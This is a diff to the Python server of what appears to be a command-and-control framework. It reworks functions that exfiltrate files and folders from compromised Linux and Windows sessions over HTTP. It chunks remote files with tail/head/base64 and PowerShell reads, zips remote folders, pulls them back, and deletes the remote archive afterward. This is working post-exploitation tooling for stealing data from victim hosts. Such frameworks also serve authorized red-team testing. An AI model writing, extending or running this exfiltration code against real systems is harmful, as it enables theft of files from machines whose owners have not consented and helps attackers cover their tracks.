@@ -652,16 +652,19 @@ def build_powershell_encoded_download(remote_file):
 
 
 
-def download_file_http(sid, remote_file, local_file):
+def download_file_http(sid, remote_file, local_file, op_id="console"):
 	session = session_manager.sessions[sid]
 	meta = session.metadata
+
+	if not op_id:
+		op_id = "console"
 
 	if meta.get("os", "").lower() == "linux":
 		host = meta.get("hostname", "").lower()
 		CHUNK_SIZE = 30000  # Number of bytes per chunk (before base64 encoding)
 		MAX_CHUNKS = 10000  # Safeguard to prevent infinite loop
 
-		# Get file size first
+		"""# Get file size first
 		size_cmd = f"stat -c %s {remote_file}"
 		session.command_queue.put(base64.b64encode(size_cmd.encode()).decode())
 		file_size_raw = session.output_queue.get()
@@ -672,6 +675,15 @@ def download_file_http(sid, remote_file, local_file):
 			file_size = int(base64.b64decode(file_size_raw).decode().strip())
 		except:
 			print(brightred + f"[-] Failed to get file size for {remote_file}")
+			return"""
+
+		# Step 1: Get file size via HTTP‐C2
+		size_output = run_command_http(sid, f"stat -c %s {remote_file}", op_id=op_id)
+		logger.debug(brightyellow + f"SIZE OUTPUT: {size_output}")
+		try:
+			file_size = int(size_output.strip())
+		except Exception:
+			print(brightred + f"[-] Failed to get file size for {remote_file}")
 			return
 
 		total_chunks = (file_size + CHUNK_SIZE - 1) // CHUNK_SIZE
@@ -681,13 +693,25 @@ def download_file_http(sid, remote_file, local_file):
 		with tqdm(total=total_chunks, desc="Downloading", unit="chunk") as pbar:
 			for i in range(total_chunks):
 				offset = i * CHUNK_SIZE
-				chunk_cmd = f"tail -c +{offset + 1} {remote_file} | head -c {CHUNK_SIZE} | base64"
+				"""chunk_cmd = f"tail -c +{offset + 1} {remote_file} | head -c {CHUNK_SIZE} | base64"
 				b64_chunk_cmd = base64.b64encode(chunk_cmd.encode()).decode()
 
 				session.command_queue.put(b64_chunk_cmd)
-				chunk_output = session.output_queue.get()
+				chunk_output = session.output_queue.get()"""
+
+				# Step 2: Fetch each chunk via HTTP-C2
+				chunk_cmd = f"tail -c +{offset + 1} {remote_file} | head -c {CHUNK_SIZE} | base64"
+				chunk_output = run_command_http(sid, chunk_cmd, op_id=op_id)
 
 				try:
+					data = base64.b64decode(chunk_output)
+					collection.extend(data)
+					pbar.update(1)
+				except Exception as e:
+					print(brightred + f"[-] Error decoding chunk {i + 1}: {e}")
+					break
+
+				"""try:
 					chunk_decoded = base64.b64decode(chunk_output)
 					data_decode = base64.b64decode(chunk_decoded)
 					collection.extend(data_decode)
@@ -695,7 +719,7 @@ def download_file_http(sid, remote_file, local_file):
 					pbar.update(1)
 				except Exception as e:
 					print(brightred + f"[-] Error decoding chunk {i + 1}: {e}")
-					break
+					break"""
 
 		try:
 			#decoded_file = base64.b64decode(collected_b64.encode())
@@ -735,7 +759,7 @@ def download_file_http(sid, remote_file, local_file):
 		f"[System.Text.Encoding]::UTF8.GetBytes($s.ToString()) -join ','"
 		)
 
-		b64_size_cmd = base64.b64encode(size_cmd.encode()).decode()
+		"""b64_size_cmd = base64.b64encode(size_cmd.encode()).decode()
 		session.command_queue.put(b64_size_cmd)
 		size_b64 = session.output_queue.get()
 		print(size_b64)
@@ -748,12 +772,25 @@ def download_file_http(sid, remote_file, local_file):
 
 		except Exception as e:
 			print(brightred + f"[-] Failed to parse file size: {e}")
+			return"""
+
+		sleep(0.03)
+		logger.debug(brightyellow + f"RUNNING COMMAND {size_cmd}" + reset)
+		size_output = run_command_http(sid, size_cmd, op_id=op_id)
+		logger.debug(f"SIZE OUTPUT IN DOWNLOAD FILE: {size_output}")
+		try:
+			# size_output is something like "49,50,51,…"
+			size_bytes = bytes(int(x) for x in size_output.split(","))
+			file_size = int(size_bytes.decode().strip())
+
+		except Exception as e:
+			print(brightred + f"[-] Failed to parse file size: {e}")
 			return
 
 		total_chunks = (file_size + CHUNK_SIZE - 1) // CHUNK_SIZE
 		#print(total_chunks)
 		#collected_b64 = ""
-		collected_b64 = bytearray()
+		#collected_b64 = bytearray()
 		collection = bytearray()
 
 		with tqdm(total=total_chunks, desc="Downloading", unit="chunk") as pbar:
@@ -770,7 +807,19 @@ def download_file_http(sid, remote_file, local_file):
 					f"[Convert]::ToBase64String($buf, 0, $read)"
 				)
 
-				b64_chunk_cmd = base64.b64encode(chunk_cmd.encode()).decode()
+				# Step 2: Fetch this chunk via HTTP-C2
+				chunk_output = run_command_http(sid, chunk_cmd, op_id=op_id)
+
+				try:
+					data = base64.b64decode(chunk_output)
+					collection.extend(data)
+					pbar.update(1)
+				except Exception as e:
+					print(brightred + f"[-] Error decoding chunk {i + 1}: {e}")
+					break
+				
+
+				"""b64_chunk_cmd = base64.b64encode(chunk_cmd.encode()).decode()
 				session.command_queue.put(b64_chunk_cmd)
 				chunk_output = session.output_queue.get()
 
@@ -784,7 +833,7 @@ def download_file_http(sid, remote_file, local_file):
 
 				except Exception as e:
 					print(brightred + f"[-] Error decoding chunk {i + 1}: {e}")
-					break
+					break"""
 
 		# Step 3: Final decode & write
 		try:
@@ -819,11 +868,14 @@ def download_file_http(sid, remote_file, local_file):
 		except Exception as e:
 			print(brightred + f"[!] Error decoding final file: {e}")
 
-def download_folder_http(sid, local_dir, remote_dir):
+def download_folder_http(sid, remote_dir, local_dir, op_id="console"):
 	session = session_manager.sessions[sid]
 	display = next((a for a, rsid in session_manager.alias_map.items() if rsid == sid), sid)
 	meta = session.metadata
 	os_type = meta.get("os","").lower()
+
+	if not op_id:
+		op_id = "console"
 
 	remote_dir = remote_dir.rstrip("/\\")
 	base = os.path.basename(remote_dir)
@@ -838,20 +890,11 @@ def download_folder_http(sid, local_dir, remote_dir):
 
 	if "windows" in os_type:
 		remote_zip = f"{remote_dir}.zip"
-		# 1) create an empty zip if needed
-		cmd = (
-			f"\"if(-Not (Test-Path \"{remote_zip}\"))"
-			f"{{Set-Content \"{remote_zip}\" ([byte[]](80,75,5,6,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0))}}\""
-		)
+		# 1) create an empty zip if needed (no output)
+		cmd = ("if(-Not (Test-Path \"{0}\"))"
+			"{{ Set-Content \"{0}\" ([byte[]](80,75,5,6,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0)) }}").format(remote_zip)
 
-		try:
-			b64_cmd = base64.b64encode(cmd.encode()).decode()
-
-		except Exception as e:
-			print(brightred + f"[-] ERROR failed to encode command: {e}")
-
-		session.command_queue.put(b64_cmd)
-		#session.output_queue.get()
+		run_command_http(sid, cmd, output=False, op_id=op_id)
 
 		# 2) copy the folder contents into it via .NET
 		zip_cmd = (
@@ -862,15 +905,7 @@ def download_folder_http(sid, local_dir, remote_dir):
 
 
 		print(brightyellow + f"[*] Zipping remote folder {remote_dir} → {remote_zip}…")
-
-		try:
-			b64_cmd = base64.b64encode(zip_cmd.encode()).decode()
-
-		except Exception as e:
-			print(brightred + f"[-] ERROR failed to encode command: {e}")
-
-		session.command_queue.put(b64_cmd)
-		#session.output_queue.get()
+		run_command_http(sid, zip_cmd, output=False, op_id=op_id)
 
 		# 2a) wait until the zip actually exists on the remote
 		check_ps = (
@@ -879,30 +914,15 @@ def download_folder_http(sid, local_dir, remote_dir):
 		)
 
 		print(brightyellow + "[*] Waiting for remote archive to appear…")
-		try:
-			b64_cmd = base64.b64encode(check_ps.encode()).decode()
-
-		except Exception as e:
-			print(brightred + f"[-] ERROR failed to encode command: {e}")
-
 		while True:
-			session.command_queue.put(b64_cmd)
-			out = session.output_queue.get()
-			out = base64.b64decode(out)
+			out = run_command_http(sid, check_ps, op_id=op_id)
+			logger.debug(f"TEST PATH OUTPUT: {out}")
+			if out and "EXISTS" in out.upper():
+				logger.debug(brightgreen + f"FOUND EXISTS IN OUTPUT")
+				break
 
-			try:
-				out = out.decode("utf-8", errors="ignore").strip()
-
-			except Exception as e:
-				print(brightred + f"[-] ERROR failed to decode command: {e}")
-
-			try:
-				if "EXISTS" in out or "exists" in out:
-					break
-				time.sleep(1)
-
-			except Exception as e:
-				print(brightred + f"[-] ERROR failed to strip command output: {e}")
+			logger.debug("SLEEPING AND WAITING FOR EXISTS IN OUTPUT")
+			time.sleep(1)
 
 		# 3) download the .zip
 		try:
@@ -913,9 +933,10 @@ def download_folder_http(sid, local_dir, remote_dir):
 
 		print(brightyellow + f"[*] Downloading archive to {local_zip}…")
 
-		session.output_queue.get()
+		#session.output_queue.get()
 		#remote_zip = remote_zip.replace("\\", "\\\\")
-		download_file_http(sid, remote_zip, local_zip)
+		logger.debug("DOWNLOADING FILE")
+		download_file_http(sid, remote_zip, local_zip, op_id=op_id)
 
 		# 4) extract locally
 		if not os.path.isdir(local_dir):
@@ -941,16 +962,9 @@ def download_folder_http(sid, local_dir, remote_dir):
 
 		os.remove(local_zip)
 
-		# 5) cleanup remote
-		cmd = f"Remove-Item \"{remote_zip}\" -Force"
-		try:
-			b64_cmd = base64.b64encode(cmd.encode()).decode()
-
-		except Exception as e:
-			print(brightred + f"[-] ERROR failed to encode command: {e}")
-
-		session.command_queue.put(b64_cmd)
-		session.output_queue.get()
+		# 5) cleanup remote zip (no output)
+		cleanup_cmd = f"Remove-Item \"{remote_zip}\" -Force"
+		run_command_http(sid, cleanup_cmd, output=False, op_id=op_id)
 
 		print(brightgreen + "[+] Extraction complete")
 
